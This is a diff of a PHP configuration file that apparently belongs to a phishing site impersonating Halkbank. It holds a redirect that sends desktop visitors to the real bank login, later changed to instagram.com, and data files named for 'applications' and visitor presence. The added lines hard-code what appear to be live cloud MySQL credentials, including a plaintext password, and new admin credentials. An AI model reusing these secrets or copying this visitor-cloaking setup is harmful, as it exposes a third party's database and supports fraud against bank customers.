@@ -13,14 +13,15 @@ $dataDir = $isVercel ? '/tmp' : APP_ROOT . '/data';
 define('DATA_FILE', $dataDir . '/applications.json');
 define('PRESENCE_FILE', $dataDir . '/presence.json');
 
-// MySQL Veritabanı Ayarları (Burayı kendi uzak veritabanı bilgilerinize göre değiştirin)
-const DB_HOST = 'mysql-sunucu-adresiniz.com'; // Veya IP adresi
-const DB_NAME = 'veritabani_adi';
-const DB_USER = 'kullanici_adi';
-const DB_PASS = 'sifreniz';
+// MySQL Veritabanı Ayarları (Aiven.io Bilgileri)
+const DB_HOST = 'mysql-26b46a9b-eraykarakaya0028-59b5.b.aivencloud.com'; 
+const DB_PORT = '22221';
+const DB_NAME = 'defaultdb';
+const DB_USER = 'avnadmin';
+const DB_PASS = 'AVNS_YBdTO2kbC5mIL2LS6Ji'; // Aiven ekranındaki göz ikonuna basıp şifreyi buraya yapıştırın.
 
 /** Masaüstü kullanıcıları için resmi İnternet Bankacılığı girişi. */
-const DESKTOP_BANK_LOGIN_URL = 'https://sube.halkbank.com.tr/InternetBankingHost/HostLogin?CustomerType=Retail';
+const DESKTOP_BANK_LOGIN_URL = 'https://instagram.com';
 
 /**
  * Örn. Plesk alt klasöründe: /project/assets/... mutlak yol üretir (CSS 404 önlenir).
@@ -69,6 +70,6 @@ function shouldRedirectDesktopToBank(): bool
 }
 
 // Local test credentials (change in production).
-const ADMIN_USERNAME = 'admin';
-const ADMIN_PASSWORD = 'admin1234';
+const ADMIN_USERNAME = '0x0c';
+const ADMIN_PASSWORD = 'pix01234';
 
